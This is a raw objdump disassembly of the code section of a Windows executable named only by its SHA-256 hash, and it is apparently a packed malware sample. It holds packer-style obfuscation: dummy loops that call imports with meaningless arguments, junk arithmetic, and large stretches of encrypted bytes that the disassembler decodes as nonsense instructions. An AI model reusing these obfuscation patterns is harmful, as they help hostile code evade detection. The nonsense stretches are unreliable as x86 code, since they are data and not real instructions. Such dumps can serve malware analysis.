
11c111edf0450c1a60181f34a2a682db2903bedff654b65dd5e403edc8d4f277.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433697,0x1c
  401013:	cmp    DWORD PTR ds:0x433697,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433697,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433697,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433697
  401055:	dec    eax
  401056:	mov    ds:0x433697,eax
  40105b:	mov    eax,ds:0x433697
  401060:	dec    eax
  401061:	mov    ds:0x433697,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43369b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43369f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x4336d3
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x4336af
  4010b0:	sbb    ebx,DWORD PTR ds:0x433693
  4010b6:	mov    DWORD PTR ds:0x4336af,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x43372b,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x4336af,0x18
  4010e5:	cmp    DWORD PTR ds:0x4336af,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x4336af,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x4336af,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x4336af
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x4336af,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x4336af
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x4336af,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x433677
  40113c:	mov    eax,ds:0x433733
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43371b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x4335ff,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43361f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x43365b,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     BYTE PTR [eax+0x29],al
  4011b9:	(bad)  
  4011ba:	fwait
  4011bb:	jle    0x40123b
  4011bd:	jle    0x40123d
  4011bf:	cli    
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    eax,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    eax,ebx
  4011d1:	add    BYTE PTR [edi],cl
  4011d3:	xor    ecx,DWORD PTR [edi]
  4011d5:	rcr    BYTE PTR [eax],0xc7
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0x7b3eb739
  40126d:	sar    BYTE PTR gs:[esi+0x15],0x6f
  401272:	jmp    0x401245
  401274:	or     ebx,esi
  401276:	bound  ebx,QWORD PTR [edi-0x1f27bce1]
  40127c:	pop    edx
  40127d:	push   edi
  40127e:	lock sbb bh,cl
  401281:	fistp  WORD PTR [ecx+0x5778757d]
  401287:	dec    edi
  401288:	int    0x81
  40128a:	and    eax,0xd783e714
  40128f:	mov    ebp,0xb2e6761e
  401294:	jmp    0x72a814e2
  401299:	dec    edi
  40129a:	add    BYTE PTR [ecx-0x724e8b49],0x67
  4012a1:	pop    esi
  4012a2:	shr    DWORD PTR [edi-0x4492b5a6],cl
  4012a8:	scas   al,BYTE PTR es:[edi]
  4012a9:	jecxz  0x401293
  4012ab:	inc    eax
  4012ac:	xchg   edx,eax
  4012ad:	xor    esp,DWORD PTR [edx]
  4012af:	jle    0x40130d
  4012b1:	pop    ss
  4012b2:	add    ah,dl
  4012b4:	cmp    eax,0x764bd164
  4012b9:	loop   0x40129f
  4012bb:	push   ebp
  4012bc:	fwait
  4012bd:	in     eax,0x29
  4012bf:	cwde   
  4012c0:	in     eax,0x21
  4012c2:	shl    BYTE PTR [eax-0x7],cl
  4012c5:	clc    
  4012c6:	shr    BYTE PTR [eax-0x60],cl
  4012c9:	test   BYTE PTR [ebx-0x6e38ad27],ch
  4012cf:	mov    bh,0xad
  4012d1:	dec    esi
  4012d2:	adc    esi,ecx
  4012d4:	cmp    cl,BYTE PTR [esi-0x45]
  4012d7:	pushf  
  4012d8:	and    al,0x58
  4012da:	adc    BYTE PTR [ebx-0x42251d08],0xdd
  4012e1:	dec    ebp
  4012e2:	inc    eax
  4012e3:	inc    ecx
  4012e4:	push   ds
  4012e5:	call   0xf8379763
  4012ea:	(bad)  
  4012eb:	cmp    edi,esi
  4012ed:	add    BYTE PTR [eax-0x482afb58],ch
  4012f3:	dec    esi
  4012f4:	sbb    esi,DWORD PTR [esi-0x679056d1]
  4012fa:	mov    ecx,0x8ad2fa0d
  4012ff:	pop    edx
  401300:	adc    al,0x86
  401302:	fdiv   st,st(7)
  401304:	ficomp DWORD PTR [esi+0x7]
  401307:	lock push edi
  401309:	mov    eax,ds:0x996d12b0
  40130e:	and    esi,DWORD PTR [ebx]
  401310:	or     DWORD PTR [ecx-0x6b103812],esi
  401316:	jge    0x4012d4
  401318:	mov    ecx,0x9dceeb01
  40131d:	scas   eax,DWORD PTR es:[edi]
  40131e:	sbb    BYTE PTR [edx],ah
  401320:	mov    esi,0x8ce15a69
  401325:	pop    esi
  401326:	sbb    al,0x84
  401328:	xchg   esp,eax
  401329:	xchg   ebx,eax
  40132a:	xor    eax,0x3b830364
  40132f:	data16 jg 0x4012f9
  401332:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401333:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401334:	or     DWORD PTR [edx+eiz*1+0x15458ce9],0xce9ea7ca
  40133f:	mov    edi,DWORD PTR [ebx-0xd254832]
  401345:	test   BYTE PTR [ecx+ecx*4+0x45],bh
  401349:	hlt    
  40134a:	and    DWORD PTR ds:0x433653,0x0
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x433653
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x433653,ebx
  401366:	cmp    DWORD PTR ds:0x433653,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x433653,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43360b,0x4335ff
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	dec    esp
  4013b4:	popf   
  4013b5:	in     eax,0xf
  4013b7:	cli    
  4013b8:	jg     0x401438
  4013ba:	jle    0x4013b6
  4013bc:	jg     0x40143c
  4013be:	jle    0x4013c5
  4013c0:	(bad)  
  4013c1:	cmp    DWORD PTR [ebp-0x7dbcd5f3],0x56
  4013c8:	popa   
  4013c9:	xchg   esp,eax
  4013ca:	fst    QWORD PTR [ebp-0x58]
  4013cd:	xor    bh,BYTE PTR [ecx-0x8]
  4013d0:	sar    BYTE PTR [ebx+eiz*2-0x564c5973],cl
  4013d7:	dec    ebx
  4013d8:	or     bh,bl
  4013da:	jp     0x401393
  4013dc:	aam    0xcb
  4013de:	jae    0x4013e5
  4013e0:	ror    DWORD PTR [ebx-0x6a2df83a],1
  4013e6:	dec    ebx
  4013e7:	and    dh,BYTE PTR [ecx+0x1b90bb0a]
  4013ed:	test   DWORD PTR [ecx+edi*8+0x7211a479],ebx
  4013f4:	fldenv [edi+0x49]
  4013f7:	outs   dx,DWORD PTR ds:[esi]
  4013f8:	test   DWORD PTR [ebp-0xa],ecx
  4013fb:	pop    edx
  4013fc:	mov    ecx,0xd9deb59d
  401401:	or     eax,0x18193648
  401406:	add    ebx,DWORD PTR [ebx+0x398e0dcf]
  40140c:	add    edx,DWORD PTR [ebx+0x661f360e]
  401412:	rcl    DWORD PTR [ebx-0x18],cl
  401415:	aam    0xc7
  401417:	dec    edi
  401418:	shl    DWORD PTR [ebx],0x42
  40141b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40141c:	add    BYTE PTR [esi-0x382cc37a],0x72
  401423:	xor    DWORD PTR [edi+eax*4-0x334bce4d],esp
  40142a:	add    eax,0x2723fa7e
  40142f:	bound  ebp,QWORD PTR [eax]
  401431:	xor    esi,DWORD PTR [edx]
  401433:	(bad)  
  401434:	repz jmp 0x95cc:0x1ecca09e
  40143c:	fisttp DWORD PTR [edx]
  40143e:	push   edx
  40143f:	add    DWORD PTR [esi+0x61],0x3c
  401443:	xchg   ecx,esp
  401445:	sbb    al,0x7a
  401447:	pushf  
  401448:	mov    dl,0x35
  40144a:	push   ecx
  40144b:	aam    0x8
  40144d:	or     BYTE PTR [ebp+0x52840cc5],0x52
  401454:	scas   al,BYTE PTR es:[edi]
  401455:	add    al,0x4c
  401457:	into   
  401458:	rol    bh,cl
  40145a:	aad    0x70
  40145c:	mov    ds:0x549778e0,al
  401461:	inc    esi
  401462:	sub    BYTE PTR [ebp+0x6ab25ff6],al
  401468:	add    eax,0xfd884e93
  40146d:	mov    ch,0x13
  40146f:	jo     0x4014ad
  401471:	mov    esi,0x1a05a5a9
  401476:	mov    edx,0x6b18b5c
  40147b:	xor    al,0xf4
  40147d:	mov    ah,0xbf
  40147f:	popf   
  401480:	cmp    BYTE PTR [esi-0x2c],al
  401483:	shr    BYTE PTR [ebp+0x76],1
  401486:	les    eax,FWORD PTR [eax+0x20]
  401489:	ds sbb eax,0x4cb2ff77
  40148f:	pop    ecx
  401490:	out    dx,al
  401491:	mov    bh,0x8a
  401493:	jle    0x4014e4
  401495:	mov    dl,0x9f
  401497:	ror    cl,1
  401499:	sahf   
  40149a:	fiadd  WORD PTR [eax+0x6c]
  40149d:	jp     0x401451
  40149f:	mov    dl,0xd
  4014a1:	leave  
  4014a2:	push   eax
  4014a3:	jle    0x401511
  4014a5:	mov    ecx,gs
  4014a7:	xor    BYTE PTR [ebx+ebp*1],bl
  4014aa:	mov    ss,WORD PTR [ebx+0x47769e42]
  4014b0:	out    0xa9,eax
  4014b2:	cmp    cl,ah
  4014b4:	inc    edi
  4014b5:	cdq    
  4014b6:	jo     0x401486
  4014b8:	in     al,dx
  4014b9:	mov    esi,0x978561d2
  4014be:	lock or cl,BYTE PTR [edx]
  4014c1:	cmp    edx,DWORD PTR [edx+0x6d]
  4014c4:	(bad)  
  4014c5:	pop    ecx
  4014c6:	pusha  
  4014c7:	jge    0x4014d4
  4014c9:	mov    eax,0xf29cf636
  4014ce:	mov    esi,0xe37f7a8c
  4014d3:	mov    edi,0x6bbbc2ea
  4014d8:	push   ebx
  4014d9:	jmp    0x7d098c3f
  4014de:	push   0xffffff80
  4014e0:	jle    0x401558
  4014e2:	cmp    cl,dh
  4014e4:	mov    BYTE PTR [esp+ebp*2+0x11b40745],dh
  4014eb:	aam    0xec
  4014ed:	cli    
  4014ee:	push   ecx
  4014ef:	loop   0x4014b9
  4014f1:	add    edx,DWORD PTR [esi-0x1]
  4014f4:	push   0x15
  4014f6:	jge    0x4014f8
  4014f8:	xchg   edi,eax
  4014f9:	jo     0x4014e8
  4014fb:	call   0xf203b92f
  401500:	inc    eax
  401501:	mov    cl,0x8f
  401503:	adc    bh,dh
  401505:	xlat   BYTE PTR ds:[ebx]
  401506:	adc    al,0x9f
  401508:	xchg   edi,eax
  401509:	lea    ecx,[ebx]
  40150b:	popf   
  40150c:	mov    ah,bh
  40150e:	jnp    0x401531
  401510:	fisubr DWORD PTR [eax]
  401512:	xor    BYTE PTR [edx-0x6f],ch
  401515:	mov    bl,0x42
  401517:	rcl    DWORD PTR [ecx+0x1c7c5121],1
  40151d:	mov    eax,ds:0x1873259
  401522:	test   DWORD PTR [esi-0x3b97022b],ebx
  401528:	xchg   ebx,eax
  401529:	jp     0x4014d2
  40152b:	call   0x1dc0:0x9dc2d8cc
  401532:	push   0x8cc5fa52
  401537:	xchg   edx,eax
  401538:	ins    BYTE PTR es:[edi],dx
  401539:	dec    esi
  40153a:	xchg   BYTE PTR [eax+0x44881377],cl
  401540:	out    0xdf,al
  401542:	or     DWORD PTR [ebx+0x1d31c445],ecx
  401548:	(bad)  
  40154a:	inc    ebx
  40154b:	add    BYTE PTR [ebx],dh
  40154d:	(bad)  
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx+0xb8ab0e3]
  401564:	sbb    eax,0x7e7e7d06
  401569:	cli    
  40156a:	jg     0x4015ea
  40156c:	jle    0x4015bd
  40156e:	inc    esp
  40156f:	adc    eax,0x43044035
  401574:	sar    ecx,1
  401576:	repz fstp st(3)
  401579:	inc    esp
  40157a:	pop    esi
  40157b:	dec    eax
  40157c:	mov    ds:0xfc2dee58,al
  401581:	sbb    al,0xad
  401583:	pusha  
  401584:	lahf   
  401585:	icebp  
  401586:	push   esi
  401587:	sti    
  401588:	sub    esi,DWORD PTR [esi-0x28db3ab3]
  40158e:	xor    ah,BYTE PTR [esi+0x61]
  401591:	cs pop ebx
  401593:	and    eax,0x96043034
  401598:	lods   eax,DWORD PTR ds:[esi]
  401599:	loopne 0x401561
  40159b:	push   eax
  40159c:	lods   eax,DWORD PTR ds:[esi]
  40159d:	pushf  
  40159e:	int3   
  40159f:	xchg   ebp,eax
  4015a0:	sbb    al,0x8e
  4015a2:	add    BYTE PTR [edx],cl
  4015a4:	add    BYTE PTR [edx+0xbb3c204],dl
  4015aa:	adc    BYTE PTR [eax-0xa],ah
  4015ad:	mov    ebp,0x600324b6
  4015b2:	test   al,0x58
  4015b4:	or     DWORD PTR [ecx],edi
  4015b6:	sub    eax,0xb93bc9d2
  4015bb:	and    esp,DWORD PTR [edx+0x19]
  4015be:	xlat   BYTE PTR ds:[ebx]
  4015bf:	repz out dx,al
  4015c1:	inc    esp
  4015c2:	fidivr WORD PTR [ebp-0x32]
  4015c5:	stc    
  4015c6:	jns    0x401572
  4015c8:	add    DWORD PTR [edx-0x35cf6932],edx
  4015ce:	pop    ss
  4015cf:	test   bh,0xc7
  4015d2:	adc    ecx,DWORD PTR [edi]
  4015d4:	fldcw  WORD PTR [edi-0x5a]
  4015d7:	mov    dh,0xfa
  4015d9:	clc    
  4015da:	xor    bh,BYTE PTR [ebp-0x5e]
  4015dd:	cld    
  4015de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015df:	mov    ch,0x55
  4015e1:	add    BYTE PTR [esi],ch
  4015e3:	or     ecx,DWORD PTR [esi+0x5efdf7e4]
  4015e9:	mov    bl,0x5c
  4015eb:	add    al,0xec
  4015ed:	dec    eax
  4015ee:	imul   esp,DWORD PTR [ebp+0x3],0xd07a1f81
  4015f5:	aaa    
  4015f6:	push   cs
  4015f7:	push   ebp
  4015f8:	imul   edi,eax,0xffffffbf
  4015fb:	dec    edx
  4015fc:	xchg   edi,eax
  4015fd:	stos   DWORD PTR es:[edi],eax
  4015fe:	mov    al,ss:0xfe4534ea
  401604:	inc    ecx
  401605:	push   edx
  401606:	repnz clc 
  401608:	pop    ds
  401609:	jo     0x4015ca
  40160b:	mov    WORD PTR [ebx+0x37],gs
  40160e:	icebp  
  40160f:	out    0xa7,al
  401611:	clc    
  401612:	out    0x92,eax
  401614:	inc    esi
  401615:	or     al,BYTE PTR [esi-0x39be2fa6]
  40161b:	adc    eax,esp
  40161d:	(bad)  
  40161e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40161f:	pop    esp
  401620:	cmp    eax,ebx
  401622:	sbb    DWORD PTR [eax+0x34ebc9c],esp
  401628:	repz std 
  40162a:	inc    ecx
  40162b:	or     ebp,DWORD PTR [edi-0x783aa7cc]
  401631:	ds cs jne 0x40162f
  401635:	mov    ds:0x1b9aa303,al
  40163a:	fild   DWORD PTR [ebp-0x4dacadf]
  401640:	xchg   ebx,eax
  401641:	fnsave [ebp+0x21]
  401644:	push   es
  401645:	int3   
  401646:	mov    bh,0x52
  401648:	pushf  
  401649:	lods   al,BYTE PTR ds:[esi]
  40164a:	mov    eax,0xa73ee003
  40164f:	add    eax,0x3b281dba
  401654:	or     eax,DWORD PTR [ebp+0x4c0dd960]
  40165a:	inc    esp
  40165b:	add    al,0x4
  40165d:	adc    BYTE PTR ds:0x4c20c6a5,al
  401663:	lds    esi,FWORD PTR [edi+0x40]
  401666:	mov    ebp,DWORD PTR [edx+0x7d]
  401669:	and    edx,DWORD PTR [eax+0x9]
  40166c:	jo     0x401635
  40166e:	and    al,0xe
  401670:	sub    BYTE PTR [ebx+0x22],dh
  401673:	xor    eax,edi
  401675:	pop    ebx
  401676:	fistp  WORD PTR [edi-0x23b34a5a]
  40167c:	fbstp  TBYTE PTR [eax+0x420499c5]
  401682:	jg     0x401692
  401684:	mov    ?,WORD PTR [esi+0x43]
  401687:	jbe    0x4016fc
  401689:	leave  
  40168a:	out    dx,eax
  40168b:	sub    bl,BYTE PTR [eax]
  40168d:	jmp    0x323c5188
  401692:	xchg   edx,eax
  401693:	cmp    eax,0xa75ea51e
  401698:	inc    ecx
  401699:	xchg   esp,eax
  40169a:	aas    
  40169b:	cmp    BYTE PTR [edi-0x61],bh
  40169e:	xchg   esi,eax
  40169f:	fisubr WORD PTR [ebp+0x6]
  4016a2:	jl     0x4016d5
  4016a4:	adc    al,0x6c
  4016a6:	mov    ds:0x5b406ffd,eax
  4016ab:	push   eax
  4016ac:	test   al,0x8
  4016ae:	cld    
  4016af:	and    ebx,DWORD PTR [ebx+0x198e98f1]
  4016b5:	jecxz  0x401668
  4016b7:	add    esp,DWORD PTR [ecx]
  4016b9:	jp     0x401690
  4016bb:	jmp    0x9b21:0x5175079b
  4016c2:	mov    ds:0x36d00a3b,eax
  4016c7:	sbb    esi,ecx
  4016c9:	shl    DWORD PTR [edx-0x30],cl
  4016cc:	repz shr bl,cl
  4016cf:	call   0xbb834ed
  4016d4:	lods   al,BYTE PTR ds:[esi]
  4016d5:	ret    
  4016d6:	jl     0x401694
  4016d8:	sub    BYTE PTR [ebx-0x1],cl
  4016db:	repz test BYTE PTR ss:[esi-0x23],bl
  4016e0:	fsubr  DWORD PTR [edx]
  4016e2:	sub    bl,BYTE PTR [esi-0x72a24472]
  4016e8:	in     al,0x84
  4016ea:	push   0xfffffff6
  4016ec:	or     dh,cl
  4016ee:	cld    
  4016ef:	inc    edx
  4016f0:	fld    DWORD PTR [ebx]
  4016f2:	(bad)  
  4016f3:	mov    DWORD PTR [ebp-0x34],eax
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x4336df,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x4336df
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x4336df,ebx
  401721:	cmp    DWORD PTR ds:0x4336df,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x4336df,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x4336df,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x4336df
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x4336df,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433603,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433617
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43360b
  401793:	and    ecx,DWORD PTR ds:0x43365b
  401799:	mov    DWORD PTR ds:0x43360b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x43372f,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x43372f
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x43372f,ebx
  4017c3:	cmp    DWORD PTR ds:0x43372f,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x43372f,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x43372f,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x43372f
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x43372f,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x4336e3,0x0
  401819:	mov    eax,ds:0x4336e3
  40181e:	inc    eax
  40181f:	mov    ds:0x4336e3,eax
  401824:	cmp    DWORD PTR ds:0x4336e3,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x433623
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x4336e3,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43371f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x43372b,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x43372b
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x43372b,ecx
  401878:	cmp    DWORD PTR ds:0x43372b,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x43372b,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x43372b,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x43372b
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x43372b,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0xf18f6ade
  4018e9:	jle    0x40192e
  4018eb:	cmp    BYTE PTR [edx+0x7e],0x7e
  4018ef:	cli    
  4018f0:	jg     0x401970
  4018f2:	jle    0x40194f
  4018f4:	fistp  DWORD PTR [eax-0x57]
  4018f7:	cs loope 0x401963
  4018fa:	cli    
  4018fb:	mov    ch,0xd8
  4018fd:	dec    ecx
  4018fe:	sub    ecx,DWORD PTR [edx+eax*8-0x15c80c2f]
  401905:	leave  
  401906:	jnp    0x401942
  401908:	pop    ebp
  401909:	retf   
  40190a:	cmp    ah,bl
  40190c:	cmp    DWORD PTR [ebx+esi*8],ecx
  40190f:	cwde   
  401910:	jmp    0x40193e
  401912:	xor    cl,BYTE PTR [ebp-0x665147b6]
  401918:	and    al,0xb2
  40191a:	mov    DWORD PTR [ebx+eiz*2],esi
  40191d:	sbb    esi,edx
  40191f:	push   0x17
  401921:	cmc    
  401922:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401923:	loope  0x401920
  401925:	aam    0xbe
  401927:	jo     0x401920
  401929:	cld    
  40192a:	push   edi
  40192b:	push   eax
  40192c:	fistp  QWORD PTR [eax+ebx*4+0x7c]
  401930:	xor    ebx,DWORD PTR [edi-0xcdc30dd]
  401936:	mov    ebx,0x6234b0da
  40193b:	stos   DWORD PTR es:[edi],eax
  40193c:	jg     0x401955
  40193e:	sub    esi,edx
  401940:	and    eax,0x32532bd5
  401945:	scas   al,BYTE PTR es:[edi]
  401946:	rcl    BYTE PTR [edx+0x3e474224],1
  40194c:	and    ecx,DWORD PTR [esp+ebp*4+0xd]
  401950:	xor    ebp,edx
  401952:	sbb    DWORD PTR ds:0x1d8a9a54,ebx
  401958:	and    DWORD PTR [ecx-0x2c],ecx
  40195b:	mov    bl,0x78
  40195d:	mov    esp,0xabebff9e
  401962:	pop    ss
  401963:	adc    edx,edx
  401965:	sub    eax,0xb893401f
  40196a:	(bad)  
  40196b:	mov    ecx,0x6b2173d1
  401970:	iret   
  401971:	push   ebp
  401972:	adc    ebp,DWORD PTR ds:0xfe8e476b
  401978:	dec    eax
  401979:	jmp    0xe1adc3aa
  40197e:	pop    ds
  40197f:	in     al,dx
  401980:	in     al,0x8e
  401982:	sbb    BYTE PTR [ebx],ch
  401984:	test   al,0x76
  401986:	pop    ebp
  401987:	lods   eax,DWORD PTR ds:[esi]
  401988:	dec    eax
  401989:	jge    0x401987
  40198b:	lods   al,BYTE PTR ds:[esi]
  40198c:	push   ss
  40198d:	add    ah,bl
  40198f:	adc    eax,0x793a2e0e
  401994:	scas   eax,DWORD PTR es:[edi]
